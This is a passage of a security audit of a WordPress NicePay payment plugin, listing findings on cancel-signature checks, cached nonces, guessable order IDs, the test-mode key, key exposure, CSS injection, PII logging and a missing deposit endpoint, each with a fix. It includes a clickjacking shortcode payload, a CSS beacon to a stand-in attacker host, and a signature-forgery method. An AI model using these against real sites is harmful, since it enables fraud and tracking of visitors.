**Problem.** `request_cancel()` wraps its verification in a conditional; omit either field and verification is skipped entirely, yet the response is still returned to the caller and trusted. `request_net_cancel()` performs **no** signature verification at all, even though spec §8 defines a net-cancel response `Signature` over `TID + MID + CancelAmt + MerchantKey` and the class already has `verify_cancel_signature()`. Worse, `request_net_cancel()`'s return value is discarded by all four of its call sites inside `request_approval()`.

```php
// includes/class-nicepay-api.php:384-393 — falls through unverified
if ( ! empty( $result['TID'] ) && ! empty( $result['Signature'] ) ) {
    $resp_cancel_amt = isset( $result['CancelAmt'] ) ? $result['CancelAmt'] : $cancel_amt;
    if ( ! $this->verify_cancel_signature( $result['TID'], $resp_cancel_amt, $result['Signature'] ) ) { ... return new WP_Error( ... ); }
}
return $result;

// includes/class-nicepay-api.php:319-323 — the entire tail of request_net_cancel()
$body   = wp_remote_retrieve_body( $response );
$result = json_decode( $body, true );
nicepay_log( 'Network cancel response', $result ? $this->redact_for_log( $result ) : 'parse_error' );
return $result ? $result : new WP_Error( ... );      // no verification, no ResultCode check

// includes/class-nicepay-api.php:226, 239, 252, 263 — return value dropped at all four sites
$this->request_net_cancel( $auth_data );
```

Contrast the correctly fail-closed approval path at [248-256](../../includes/class-nicepay-api.php#L248). And `process_refund()` at [gateway.php:451-470](../../includes/class-nicepay-gateway.php#L451) branches on `$result['ResultCode']` alone and never compares `$result['CancelAmt']` to `$cancel_amt`.

**Impact.** Two distinct problems. The fail-open verification is asymmetric with the approval path — a cancel response that simply omits `Signature` is accepted as authoritative and WooCommerce records a refund that may never have happened. The **silent net-cancel** is the more immediately real one and needs no attacker: when an approval fails and the reversal also fails, the customer's card stays charged with no order behind it and nobody — merchant or customer — is told.

The docs contradict the code: [ARCHITECTURE.md:351](../../docs/ARCHITECTURE.md#L351) claims "Every request and response is verified using SHA-256 hashing" and [README.md:204](../../README.md#L204) claims the same. See SECURITY-27.

**Recommendation.** Make both paths fail-closed, mirroring the approval path. Capture the net-cancel return value at all four call sites and raise a persistent admin notice when reversal fails. In `process_refund()`, assert `(int) $result['CancelAmt'] === (int) $cancel_amt` before returning `true`.

```php
// includes/class-nicepay-api.php — replace lines 384-391
if ( empty( $result['TID'] ) || empty( $result['Signature'] ) ) {
    nicepay_log( 'Cancel response missing TID or Signature' );
    return new WP_Error( 'nicepay_signature_error', __( 'Cancel response could not be verified.', 'nicepay-payment-gateway' ) );
}
$resp_cancel_amt = isset( $result['CancelAmt'] ) ? $result['CancelAmt'] : $cancel_amt;
if ( ! $this->verify_cancel_signature( $result['TID'], $resp_cancel_amt, $result['Signature'] ) ) {
    nicepay_log( 'Cancel response signature verification failed' );
    return new WP_Error( 'nicepay_signature_error', __( 'Cancel signature verification failed.', 'nicepay-payment-gateway' ) );
}

// ...and in request_net_cancel(), replace lines 319-323
$result = json_decode( wp_remote_retrieve_body( $response ), true );
if ( ! $result || empty( $result['TID'] ) || empty( $result['Signature'] ) ) {
    nicepay_log( 'Net cancel response unverifiable', $result ? $this->redact_for_log( $result ) : 'parse_error' );
    return new WP_Error( 'nicepay_parse_error', __( 'Failed to verify cancel response.', 'nicepay-payment-gateway' ) );
}
$net_amt = isset( $result['CancelAmt'] ) ? $result['CancelAmt'] : $auth_data['Amt'];
if ( ! $this->verify_cancel_signature( $result['TID'], $net_amt, $result['Signature'] ) ) {
    return new WP_Error( 'nicepay_signature_error', __( 'Net cancel signature verification failed.', 'nicepay-payment-gateway' ) );
}
return $result;

// ...and at each of the four call sites in request_approval()
$nc = $this->request_net_cancel( $auth_data );
if ( is_wp_error( $nc ) || ! isset( $nc['ResultCode'] ) || '2001' !== $nc['ResultCode'] ) {
    nicepay_log( 'NET CANCEL FAILED — customer may be charged with no order', array( 'TID' => $auth_data['TxTid'] ) );
    set_transient( 'nicepay_netcancel_failure', $auth_data['TxTid'], WEEK_IN_SECONDS );
}
```

**Spec:** §8 (net cancel response Signature), §9 (cancel response, success codes 2001/2211). **Effort:** small.

---

### SECURITY-07 · 🟡 MEDIUM · The public CSRF nonce is minted inside cacheable shortcode output

**Files:** [templates/standalone-payment-form.php:305](../../templates/standalone-payment-form.php#L305); [nicepay-payment-gateway.php:297-306](../../nicepay-payment-gateway.php#L297), [314-320](../../nicepay-payment-gateway.php#L314)

**Attacker capability:** none — this is a reliability failure, not an attack.

**Problem.** The nonce that authorises `ajax_init_payment` is generated inline during shortcode render, and the parallel `wp_localize_script()` nonce is likewise baked into page output. Nonces are time-bounded (12h tick, 24h validity) and, for logged-in users, per-user and per-session. Any full-page cache — a caching plugin, a CDN, or a reverse proxy — serves a snapshot of that HTML to everyone for the cache TTL. A repo-wide grep for `DONOTCACHEPAGE`, `nocache`, `rest_cookie` and `wp_cache_` returns **zero hits**.

```php
// templates/standalone-payment-form.php:305
xhr.send('action=nicepay_init_payment&nonce=<?php echo esc_js( wp_create_nonce( 'nicepay_init_payment' ) ); ?>&amount=…');

// nicepay-payment-gateway.php:314-319 — no status code, so caches and monitoring see a 200
if ( ! wp_verify_nonce( isset( $_POST['nonce'] ) ? sanitize_text_field( wp_unslash( $_POST['nonce'] ) ) : '', 'nicepay_init_payment' ) ) {
    wp_send_json_error( array( 'message' => __( 'Invalid request.', 'nicepay-payment-gateway' ) ) );
    return;
}
```

**Impact.** Two failure modes on a perfectly ordinary production setup. (1) A cached page older than 24 hours serves an expired nonce and **every visitor** gets "Invalid request." at HTTP 200 with no diagnostic — payments are dead site-wide, and the merchant has no signal because `nicepay_log()` is a no-op without `WP_DEBUG`. (2) For logged-in users, a cached copy carries some other user's nonce, so verification fails for everyone whose session differs from the one that populated the cache. Total feature failure of the shortcode payment flow, triggered by a configuration the plugin never warns about.

**Recommendation.** Fetch the nonce at click time rather than baking it into the page. At minimum, define `DONOTCACHEPAGE` in `render_payment_shortcode()`, document the caching requirement in CONFIGURATION.md, and return HTTP 403 from the nonce failure branch so the breakage is visible to monitoring. Once SECURITY-03's server-side price authority is in place, the nonce carries much less weight and this becomes purely a reliability fix.

```php
// nicepay-payment-gateway.php render_payment_shortcode(), before rendering
if ( ! defined( 'DONOTCACHEPAGE' ) ) { define( 'DONOTCACHEPAGE', true ); }

// better: late-bind the nonce
add_action( 'wp_ajax_nicepay_nonce', array( $this, 'ajax_nonce' ) );
add_action( 'wp_ajax_nopriv_nicepay_nonce', array( $this, 'ajax_nonce' ) );
public function ajax_nonce() {
    wp_send_json_success( array( 'nonce' => wp_create_nonce( 'nicepay_init_payment' ) ) );
}

// and make the failure visible
wp_send_json_error( array( 'message' => __( 'Your session expired. Please reload the page.', 'nicepay-payment-gateway' ) ), 403 );
```

**Effort:** small.

---

### SECURITY-08 · 🟡 MEDIUM · Standalone return handler runs the irreversible capture even when no transaction row matches

**Files:** [includes/class-nicepay-return-handler.php:51](../../includes/class-nicepay-return-handler.php#L51), [97](../../includes/class-nicepay-return-handler.php#L97), [142-149](../../includes/class-nicepay-return-handler.php#L142)

**Attacker capability:** the payer themselves (mostly self-harm), or anyone at all while the plugin is in its default test mode.

**Problem.** `$transaction = nicepay_get_transaction_by_moid( $moid );` may return `null`, and no null check follows. The handler proceeds to `request_approval()` — the irreversible server-to-server capture — and then guards every database write with `if ( $transaction )`. When `$transaction` is null the money is captured, nothing is persisted, and the customer is shown a full "Payment Successful" page. The WooCommerce handler correctly hard-fails in the same situation ([gateway.php:235-238](../../includes/class-nicepay-gateway.php#L235)) — the two handlers disagree.

```php
// includes/class-nicepay-return-handler.php:51, 97, 142-149
$transaction = nicepay_get_transaction_by_moid( $moid );   // may be null; no check
...
$result = $this->api->request_approval( $auth_data );      // executed unconditionally
...
if ( $this->api->is_success_code( $result_code, $result_method ) ) {
    $update_data['status'] = ( $result_method === 'VBANK' ) ? 'waiting' : 'paid';
    if ( $transaction ) { nicepay_update_transaction( $transaction->id, $update_data ); }
    $this->render_result_page( true, $result_msg, $result );   // success page renders regardless
}
```

**Impact.** Money captured with zero merchant-side record: no transaction row, no TID stored, no way to locate the payment for a refund except through the NICEPAY back office. Secondarily the endpoint will issue outbound approval attempts against the merchant's MID for arbitrary attacker-chosen TID/AuthToken values whenever the signature gate can be passed, with each call holding a PHP worker for up to 30 seconds ([api.php:214](../../includes/class-nicepay-api.php#L214)).

In the shipped default configuration `nicepay_mode` is `test` ([nicepay-payment-gateway.php:151](../../nicepay-payment-gateway.php#L151)) with the vendor's **published** test merchant key hardcoded at [line 34](../../nicepay-payment-gateway.php#L34), so anyone can compute `sha256(AuthToken . 'nicepay00m' . Amt . <public key>)`, pass `verify_auth_signature()`, and drive `request_approval()` with arbitrary values and a garbage Moid, unlimited times. See SECURITY-10.

**Recommendation.** Abort before `request_approval()` when no transaction row matches, exactly as the WooCommerce handler does. A signature-valid response for an unknown Moid is an integrity failure, not a payment: log it, call `request_net_cancel()`, and render the failure page. Add a per-IP rate limit.

```php
// includes/class-nicepay-return-handler.php, replace line 51 and add immediately after:
$transaction = nicepay_get_transaction_by_moid( $moid );
if ( ! $transaction ) {
    nicepay_log( 'Standalone return: no transaction for moid', $moid );
    if ( ! empty( $net_cancel_url ) && ! empty( $auth_token ) ) {
        $this->api->request_net_cancel( array(
            'TxTid' => $tx_tid, 'AuthToken' => $auth_token, 'Amt' => $amt, 'NetCancelURL' => $net_cancel_url,
        ) );
    }
    $this->render_result_page( false, __( 'This payment could not be matched to an order.', 'nicepay-payment-gateway' ) );
    return;
}
```

**Spec:** §8 (net cancel on merchant internal error). **Effort:** small.

---

### SECURITY-09 · 🟡 MEDIUM · `Moid` is guessable (~13 bits) and the return endpoint is a known/unknown oracle

**Files:** [includes/class-nicepay-api.php:66-68](../../includes/class-nicepay-api.php#L66); [includes/class-nicepay-gateway.php:123](../../includes/class-nicepay-gateway.php#L123), [235-238](../../includes/class-nicepay-gateway.php#L235), [270](../../includes/class-nicepay-gateway.php#L270)

**Attacker capability:** none.

**Problem.**

```php
// includes/class-nicepay-api.php:66-68
public function generate_moid( $prefix = 'WC' ) {
    return $prefix . '_' . date( 'YmdHis' ) . '_' . wp_rand( 1000, 9999 );
}
// includes/class-nicepay-gateway.php:123
$moid = $this->api->generate_moid( 'WC' . $order->get_id() );
```

A second-resolution timestamp plus ~13.1 bits of randomness, with the order ID embedded verbatim. `handle_return()` then answers an unknown Moid with `wp_die(..., array('response' => 404))` ([235-238](../../includes/class-nicepay-gateway.php#L235)) and a known Moid with a 302 to checkout ([270](../../includes/class-nicepay-gateway.php#L270)) — a clean boolean oracle over the transaction table.

**Impact.** An attacker who knows a WooCommerce order ID (sequential, and leaked in order-received URLs, invoices and admin links) can recover the exact Moid in ~9,000 requests per candidate second, unlocking SECURITY-04. Rated medium because the probing is itself destructive — a hit immediately flips the order to `failed` — so the oracle adds reconnaissance value rather than a separate compromise. Fixing Moid entropy is nonetheless the cheapest way to narrow that path.

> **Correction to a common assumption.** Two WooCommerce checkouts in the same second can *never* collide, because the prefix is `'WC' . $order->get_id()`. Cross-payment misattribution is possible only on the **standalone** path, where the prefix is the constant `'SP'` ([nicepay-payment-gateway.php:335](../../nicepay-payment-gateway.php#L335)): two `ajax_init_payment` calls in the same second collide with p ≈ 1/9,000, and `nicepay_get_transaction_by_moid()` ([nicepay-functions.php:130-134](../../includes/nicepay-functions.php#L130), no `ORDER BY`) would then return an arbitrary one of the two rows. The schema declares `KEY idx_moid (moid)` — a **non-unique** index ([nicepay-payment-gateway.php:142](../../nicepay-payment-gateway.php#L142)) — so duplicates are accepted silently.

**Recommendation.** (1) Replace `wp_rand( 1000, 9999 )` with `bin2hex( random_bytes( 8 ) )` (64 bits; spec §4 allows 64 bytes for Moid) and drop the order ID from the prefix — the mapping already lives in the `wc_order_id` column and in `_nicepay_moid` order meta. (2) Return an identical generic response for unknown-Moid and invalid-signature cases, logging the distinction server-side only. (3) Add `UNIQUE KEY idx_moid (moid)` so a collision fails loudly.

```php
// includes/class-nicepay-api.php
public function generate_moid( $prefix = 'WC' ) {
    try { $rand = bin2hex( random_bytes( 8 ) ); }
    catch ( Exception $e ) { $rand = wp_generate_password( 16, false, false ); }
    return $prefix . '_' . gmdate( 'YmdHis' ) . '_' . $rand;
}
// nicepay-payment-gateway.php create_tables(): replace KEY idx_moid (moid) with
//   UNIQUE KEY idx_moid (moid),
```

**Spec:** §4 (Moid, 64 bytes). **Effort:** small.

---

### SECURITY-10 · 🟡 MEDIUM · Test mode is the shipped default with a publicly published merchant key, and neither misconfiguration warns

**Files:** [nicepay-payment-gateway.php:33-34](../../nicepay-payment-gateway.php#L33), [150-163](../../nicepay-payment-gateway.php#L150); [includes/class-nicepay-api.php:22-33](../../includes/class-nicepay-api.php#L22); [includes/class-nicepay-gateway.php:76-86](../../includes/class-nicepay-gateway.php#L76); [templates/standalone-payment-form.php:16-49](../../templates/standalone-payment-form.php#L16), [131](../../templates/standalone-payment-form.php#L131)

**Attacker capability:** for state (1), anyone who reads the payment form's HTML.

**Problem.** On activation the plugin sets `nicepay_mode = 'test'` and seeds `nicepay_test_merchant_key` with the vendor's **published** test key (identical to the one in the public spec digest §3). In test mode the signature scheme therefore provides **zero authenticity** — anyone can compute a valid Signature for MID `nicepay00m`. There is no guard against the opposite misconfiguration either: `is_available()` silently returns false when live credentials are missing (the gateway just vanishes from checkout), and the standalone shortcode has no equivalent check at all — it renders a payment form with an empty `MID` value and a SignData computed with an empty merchant key.

```php
// nicepay-payment-gateway.php:151-155
add_option( 'nicepay_mode', 'test' );
add_option( 'nicepay_test_mid', NICEPAY_TEST_MID );
add_option( 'nicepay_test_merchant_key', NICEPAY_TEST_MERCHANT_KEY );
add_option( 'nicepay_live_mid', '' );
add_option( 'nicepay_live_merchant_key', '' );

// includes/class-nicepay-gateway.php:81-83 — correct, but silent
if ( ! $this->api->get_mid() || ! $this->api->get_merchant_key() ) { return false; }

// templates/standalone-payment-form.php:131 — renders empty when unconfigured
<input type="hidden" name="MID" value="<?php echo esc_attr( $api->get_mid() ); ?>">
```

**Impact.** Two silent failure modes. (1) A site left in test mode processes real customer checkouts against `nicepay00m`: no money is ever captured, yet orders are marked paid and stock is decremented — and in that state every forgery-based issue in this report becomes exploitable by anyone, because the signing key is public. (2) A site switched to live without pasting credentials loses its checkout option with no error anywhere, while shortcode pages keep rendering a broken form. The only indicators are the mode badge at [class-nicepay-admin.php:135-137](../../admin/class-nicepay-admin.php#L135) and the inline notices at [256-264](../../admin/class-nicepay-admin.php#L256) — both confined to one settings screen an admin visits once.

**Recommendation.** Add an `admin_notices` handler that is impossible to miss; add a `sanitize_callback` on `nicepay_mode` that refuses to switch to live while credentials are empty; mirror `is_available()` inside the standalone template.

```php
// admin/class-nicepay-admin.php — add_action( 'admin_notices', array( $this, 'config_notices' ) );
public function config_notices() {
    if ( ! current_user_can( 'manage_options' ) ) { return; }
    $mode = get_option( 'nicepay_mode', 'test' );
    $url  = esc_url( admin_url( 'admin.php?page=nicepay-settings&tab=api' ) );
    if ( 'live' === $mode && ( ! get_option( 'nicepay_live_mid' ) || ! get_option( 'nicepay_live_merchant_key' ) ) ) {
        printf( '<div class="notice notice-error"><p><strong>%s</strong> %s <a href="%s">%s</a></p></div>',
            esc_html__( 'NicePay is in Live mode but has no live credentials.', 'nicepay-payment-gateway' ),
            esc_html__( 'Payments are currently disabled at checkout.', 'nicepay-payment-gateway' ),
            $url, esc_html__( 'Add credentials', 'nicepay-payment-gateway' ) );
    } elseif ( 'test' === $mode ) {
        printf( '<div class="notice notice-warning"><p><strong>%s</strong> %s <a href="%s">%s</a></p></div>',
            esc_html__( 'NicePay is in TEST mode.', 'nicepay-payment-gateway' ),
            esc_html__( 'Orders will be marked paid but no money is captured, and signatures use the public test key.', 'nicepay-payment-gateway' ),
            $url, esc_html__( 'Switch to Live', 'nicepay-payment-gateway' ) );
    }
}

// templates/standalone-payment-form.php, after line 16
if ( ! $api->get_mid() || ! $api->get_merchant_key() ) {
    if ( current_user_can( 'manage_options' ) ) {
        echo '<div class="nicepay-notice nicepay-notice-error" role="alert"><span>'
            . esc_html__( 'NicePay is not configured: add your MID and merchant key in NicePay > Settings.', 'nicepay-payment-gateway' )
            . '</span></div>';
    }
    return;
}
```

**Spec:** §12 (test MID `nicepay00m`), §3 (published test merchant key). **Effort:** small.

---

### SECURITY-11 · 🟡 MEDIUM · Merchant keys are echoed in cleartext into the settings page HTML

**Files:** [admin/class-nicepay-admin.php:276-282](../../admin/class-nicepay-admin.php#L276), [294-301](../../admin/class-nicepay-admin.php#L294)

**Attacker capability:** an actor already inside an administrator's browser session (wp-admin XSS from any plugin, a malicious browser extension, or a screen recording).

**Problem.**

```php
// admin/class-nicepay-admin.php:297-299
<input type="password" name="nicepay_live_merchant_key" class="large-text"
       value="<?php echo esc_attr( get_option( 'nicepay_live_merchant_key' ) ); ?>"
       autocomplete="off">
```

Identical at [278-280](../../admin/class-nicepay-admin.php#L278) for `nicepay_test_merchant_key`. `type="password"` masks it visually but the cleartext is in the HTML source: View Source, the DOM inspector, any extension with host permissions, `document.querySelector('[name=nicepay_live_merchant_key]').value`, and any password manager that offers to save it (`autocomplete="off"` is widely ignored by modern managers). It is placed in the page on every settings-page load whether or not the admin intends to change it.

**Impact.** The merchant key is the sole secret behind every signature in this integration — whoever holds it can forge auth, approval and cancel responses against the merchant's MID, defeating the plugin's entire integrity model. It also widens a database-backup leak into a browser-artifact leak. The page *is* correctly gated behind `manage_options` (menu registration at [line 22](../../admin/class-nicepay-admin.php#L22), guard at [125](../../admin/class-nicepay-admin.php#L125)), so this is a secret-handling defect rather than a privilege-boundary crossing.

**Recommendation.** Never echo the stored key. Render an empty field with a masked placeholder showing only that a key is set, and treat an empty submission as "leave unchanged" via a `sanitize_callback`. Offer an explicit "Clear key" checkbox, and a "Key set — last updated ⟨date⟩" status line. [DEVELOPER-GUIDE.md:450-457](../../docs/DEVELOPER-GUIDE.md#L450) already documents the `option_nicepay_live_merchant_key` filter for wp-config-based credentials — this genuinely works (`get_option()` applies the `option_{$option}` filter, and [api.php:31](../../includes/class-nicepay-api.php#L31) calls `get_option()`); promote it to the recommended production path in the UI itself.

```php
<?php $live_key = (string) get_option( 'nicepay_live_merchant_key' ); ?>
<input type="password" name="nicepay_live_merchant_key" class="large-text" value=""
       autocomplete="new-password" spellcheck="false"
       placeholder="<?php echo $live_key
           ? esc_attr( sprintf( __( 'Key set (ends …%s) — leave blank to keep', 'nicepay-payment-gateway' ), substr( $live_key, -4 ) ) )
           : esc_attr__( 'Paste your live merchant key', 'nicepay-payment-gateway' ); ?>">

// register_settings(): treat empty as "unchanged"
register_setting( 'nicepay_api', 'nicepay_live_merchant_key', array(
    'type'              => 'string',
    'sanitize_callback' => function ( $value ) {
        $value = is_string( $value ) ? trim( $value ) : '';
        return '' === $value ? (string) get_option( 'nicepay_live_merchant_key' ) : $value;
    },
) );
```

**Effort:** small.

---

### SECURITY-12 · 🟡 MEDIUM · `button_color` reaches a `style` attribute with `esc_attr()` only — Author-level CSS injection

**Files:** [templates/standalone-payment-form.php:54-55](../../templates/standalone-payment-form.php#L54), [157-160](../../templates/standalone-payment-form.php#L157); [nicepay-payment-gateway.php:242](../../nicepay-payment-gateway.php#L242), [248-259](../../nicepay-payment-gateway.php#L248), [393](../../nicepay-payment-gateway.php#L393)

**Attacker capability:** an **Author** account (can publish; lacks `unfiltered_html`). A Contributor gets the same primitive in post preview.

**Problem.** `esc_attr()` encodes quotes and angle brackets so the attribute cannot be broken out of, but it does not touch `:` or `;` — arbitrary additional CSS declarations pass through untouched.

```php
// templates/standalone-payment-form.php:54-55
<button type="button" class="<?php echo esc_attr( $atts['button_class'] ); ?>"
        <?php if ( ! empty( $atts['button_color'] ) ) : ?>style="background:<?php echo esc_attr( $atts['button_color'] ); ?>"<?php endif; ?>
```

The AJAX save path *does* apply `sanitize_hex_color()` ([nicepay-payment-gateway.php:393](../../nicepay-payment-gateway.php#L393)), but `shortcode_atts( $defaults, $raw_atts, 'nicepay_payment' )` at [line 259](../../nicepay-payment-gateway.php#L259) gives raw post-content attributes **precedence** over the sanitised preset defaults assembled at 248-257 — so the validation is bypassed by simply typing the attribute.

**Impact.** WordPress reserves raw HTML/CSS injection for `unfiltered_html`, which Authors and Contributors do not have — and unlike a `style` attribute typed into post content, this value never passes through KSES / `safecss_filter_attr` at all, so even properties KSES would strip get through. Concretely: a full-viewport transparent overlay for clickjacking, pseudo-element text spoofing of the amount shown next to the button, or `background:url(https://attacker/log?u=…)` to silently log every visitor's IP and User-Agent to a third party from a page the site owner believes is first-party.

```
[nicepay_payment amount="1000" goods_name="x"
  button_color="transparent;position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.01;z-index:2147483647"]
```

**Recommendation.** Run `sanitize_hex_color()` on `$atts['button_color']` in the template, matching what the AJAX handler already does. While there, allowlist `currency` to KRW/USD and `display_mode` to inline/modal (both are currently only `sanitize_text_field()`-ed, at [lines 17](../../templates/standalone-payment-form.php#L17) and [20](../../templates/standalone-payment-form.php#L20)), and reduce `button_class` to `sanitize_html_class()` per token. Note that `pay_method` is **already** correctly allowlisted in the same file at [line 34](../../templates/standalone-payment-form.php#L34) — the pattern exists, it is just not applied uniformly.

```php
// templates/standalone-payment-form.php, add to the setup block near line 46
$button_color = sanitize_hex_color( (string) $atts['button_color'] );
$button_class = implode( ' ', array_filter( array_map( 'sanitize_html_class', preg_split( '/\s+/', (string) $atts['button_class'] ) ) ) );
if ( '' === $button_class ) { $button_class = 'nicepay-pay-button'; }
$currency     = in_array( $currency, array( 'KRW', 'USD' ), true ) ? $currency : 'KRW';
$display_mode = in_array( $display_mode, array( 'inline', 'modal' ), true ) ? $display_mode : 'inline';

// then at lines 54-55 and 157-159
<button type="button" class="<?php echo esc_attr( $button_class ); ?>"
        <?php if ( $button_color ) : ?>style="background:<?php echo esc_attr( $button_color ); ?>"<?php endif; ?>
```

**Effort:** trivial.

---

### SECURITY-13 · 🟡 MEDIUM · Log redaction omits every buyer PII field; the unredacted PG response and `AuthToken` are persisted forever

**Files:** [includes/class-nicepay-api.php:157-174](../../includes/class-nicepay-api.php#L157), [187](../../includes/class-nicepay-api.php#L187); [includes/nicepay-functions.php:16-35](../../includes/nicepay-functions.php#L16), [77-79](../../includes/nicepay-functions.php#L77); [includes/class-nicepay-gateway.php:207](../../includes/class-nicepay-gateway.php#L207), [331-332](../../includes/class-nicepay-gateway.php#L331); [includes/class-nicepay-return-handler.php:124-125](../../includes/class-nicepay-return-handler.php#L124)

**Attacker capability:** anyone who can read `wp-content/debug.log` (misconfigured host, directory listing, exposed backup), or any plugin/role with database read access.

**Problem.**

```php
// includes/class-nicepay-api.php:162-168
$sensitive_keys = array( 'AuthToken', 'SignData', 'Signature', 'MerchantKey', 'CardNo', 'CardNumber', 'VbankNum' );
foreach ( $sensitive_keys as $key ) {
    if ( isset( $data[ $key ] ) && is_string( $data[ $key ] ) && strlen( $data[ $key ] ) > 8 ) {
```

Compared with the approval-response field list in spec §7 this misses **every** personal-data field: `BuyerName`, `BuyerEmail`, `BuyerTel`, `MallUserID` (which the plugin sets to the buyer's email at [gateway.php:207](../../includes/class-nicepay-gateway.php#L207)), `AuthCode`, `RcptAuthCode`, `RcptTID`, `CartData` (4000 bytes) and `MallReserved`. The `strlen > 8` condition means even a listed 6-digit `AuthCode` would be logged whole.

```php
// includes/class-nicepay-gateway.php:331-332 — stored verbatim, forever
'auth_token'   => $auth_token,
'payment_data' => $result,
// includes/nicepay-functions.php:17-19 — and no logging at all in production
if ( ! defined( 'WP_DEBUG' ) || ! WP_DEBUG ) { return; }
```

[api.php:187](../../includes/class-nicepay-api.php#L187) also writes an attacker-controlled string into the log with no CR/LF stripping — log-entry forgery.

**Impact.** Buyer name, email and phone — personal data under both GDPR and Korea's PIPA/KISA regime — land in log files and in a plugin database table with no redaction, no encryption, no retention limit and no deletion path. There is **no `uninstall.php`** (confirmed absent) and **no privacy exporter/eraser hooks** (repo-wide grep for `wp_privacy`, `exporter`, `eraser`, `uninstall`: zero hits), so deleting the plugin leaves the whole table and all PII behind, and a data-subject erasure request cannot be honoured. A converse problem compounds it: `nicepay_log()` returns immediately unless `WP_DEBUG` is on, so a production site has **no payment audit trail at all** — the only two states are "nothing logged" and "PII logged in the clear". Note also that `auth_token` is a *spent credential* with no post-approval use anywhere in this codebase, yet it is retained indefinitely alongside the PII.

**Recommendation.** Four changes: (1) extend `$sensitive_keys` and drop the `strlen > 8` condition; (2) strip CR/LF from any logged value; (3) whitelist the response fields persisted into `payment_data` and stop persisting `auth_token` after approval; (4) decouple audit logging from `WP_DEBUG` — always log approvals and cancels through `wc_get_logger()->info()` with redaction applied, and never fall back to `error_log()`. Then register `wp_privacy_personal_data_exporters` / `…_erasers` and add an `uninstall.php` that drops the table and deletes every `nicepay_*` option.

```php
private function redact_for_log( $data ) {
    if ( ! is_array( $data ) ) { return $data; }
    $sensitive = array(
        'AuthToken', 'SignData', 'Signature', 'MerchantKey',
        'CardNo', 'CardNumber', 'VbankNum',
        'BuyerName', 'BuyerEmail', 'BuyerTel', 'MallUserID', 'UserCI',
        'AuthCode', 'RcptAuthCode', 'RcptTID', 'CartData', 'MallReserved',
    );
    foreach ( $sensitive as $key ) {
        if ( ! isset( $data[ $key ] ) || ! is_string( $data[ $key ] ) ) { continue; }
        $v = $data[ $key ];
        $data[ $key ] = strlen( $v ) > 8 ? substr( $v, 0, 2 ) . '***' . substr( $v, -2 ) : '***';
    }
    return $data;
}

function nicepay_log( $message, $data = null, $level = 'debug' ) {
    if ( 'debug' === $level && ( ! defined( 'WP_DEBUG' ) || ! WP_DEBUG ) ) { return; }
    $entry = '[NicePay] ' . str_replace( array( "\r", "\n" ), ' ', (string) $message );
    if ( null !== $data ) {
        $rendered = ( is_array( $data ) || is_object( $data ) ) ? wp_json_encode( $data, JSON_UNESCAPED_UNICODE ) : (string) $data;
        $entry .= ' | ' . str_replace( array( "\r", "\n" ), ' ', $rendered );
    }
    if ( function_exists( 'wc_get_logger' ) ) {
        wc_get_logger()->log( $level, $entry, array( 'source' => 'nicepay' ) );
    }
}
```

**Spec:** §7 (approval response field list), §4 (`MallUserID`, `UserCI`). **Effort:** medium.

---

### SECURITY-14 · 🟡 MEDIUM · No VBANK deposit-notification endpoint

**Files:** [includes/class-nicepay-gateway.php:196-198](../../includes/class-nicepay-gateway.php#L196), [370-378](../../includes/class-nicepay-gateway.php#L370); [nicepay-payment-gateway.php:156](../../nicepay-payment-gateway.php#L156), [202-212](../../nicepay-payment-gateway.php#L202)

**Category:** functionality (the security value — deposit-amount verification, source-IP pinning — is downstream of building the endpoint at all).

**Problem.** A successful VBANK authorisation only issues a virtual account number; the money arrives later, and NICEPAY announces it with a server-to-server 입금통보 POST from three fixed source IPs (spec §2: `121.133.126.10`, `121.133.126.11`, `211.33.136.39`). The plugin implements no such endpoint — `register_endpoints()` registers exactly one rewrite (`^nicepay-return/?$`) and the VBANK branch sets the order to `on-hold` and stops.

```php
// includes/class-nicepay-gateway.php:370-378 — the terminal state for VBANK
if ( $result_method === 'VBANK' ) {
    $order->update_status( 'on-hold', sprintf(
        __( 'Awaiting virtual account deposit. Bank: %1$s, Account: %2$s, Expires: %3$s', ... ), ... ) );
}
// includes/class-nicepay-gateway.php:196-198 — sent to the PG, never acted on
if ( in_array( 'VBANK', $enabled_methods, true ) ) {
    $form_data['VbankExpDate'] = $this->api->get_vbank_exp_date();
}
```

VBANK is one of the four methods **enabled by default** ([nicepay-payment-gateway.php:156](../../nicepay-payment-gateway.php#L156)).

**Impact.** VBANK orders never complete automatically. A merchant enabling Virtual Account gets a payment method that permanently strands orders in `on-hold`, forcing manual reconciliation against the NICEPAY back office; manual completion based on an unverified customer claim ("I paid") is itself a fraud surface. Expired virtual accounts are never cancelled and reserved stock is never released. Because there is no notification endpoint at all, there is also no place where a deposit amount *could* be compared against the order total.

**Recommendation.** Add a dedicated deposit-notification endpoint (a second rewrite rule plus a WooCommerce API route). That endpoint **is** genuinely server-to-server, so on it: verify the signature, verify the source IP against the three documented addresses (resolving `HTTP_X_FORWARDED_FOR` only behind a known proxy), match the transaction by TID, assert the deposited amount equals the order total, and only then call `payment_complete()`. Also schedule a daily cron that cancels transactions whose `vbank_exp_date` has passed and restores stock, and document the inbound IPs in CONFIGURATION.md so merchants can open their firewall.

> Do **not** add an IP allowlist to the two existing return endpoints — both receive a browser POST ([payment-form.php:80-82](../../templates/payment-form.php#L80), [standalone-payment-form.php:319-321](../../templates/standalone-payment-form.php#L319)), so an IP check there would break every payment.

**Spec:** §2 (inbound deposit-notification IPs), §7 VBANK extras. **Effort:** large.

---

### SECURITY-15 · 🔵 LOW · Translated strings concatenated into HTML, including a quote-unsafe attribute context

**Files:** [assets/js/nicepay-admin.js:80](../../assets/js/nicepay-admin.js#L80), [84](../../assets/js/nicepay-admin.js#L84); [admin/class-nicepay-admin.php:757-768](../../admin/class-nicepay-admin.php#L757); [templates/standalone-payment-form.php:314](../../templates/standalone-payment-form.php#L314)

**Attacker capability:** control of one translation string — realistically a translation-management plugin that lets site staff edit `msgstr` values, or a compromised `.mo` shipped in a fork.

**Problem.** Three sinks build HTML by concatenation from values originating in translation files.

```js
// assets/js/nicepay-admin.js:80 — attribute context, quote-unsafe escaper
'<input type="text" id="nicepay-modal-input" placeholder="' + $('<span>').text(opts.inputPlaceholder).html() + '" autocomplete="off">' +
// assets/js/nicepay-admin.js:84 — confirmClass concatenated with no escaping at all
'<button type="button" class="nicepay-modal-btn ' + opts.confirmClass + '" id="nicepay-modal-confirm">' + $('<span>').text(opts.confirmText).html() + '</button>'
// assets/js/nicepay-admin.js:92-94 — the auto-focus that makes it zero-click
setTimeout(function() { $('#nicepay-modal-input').focus(); }, 100);
```

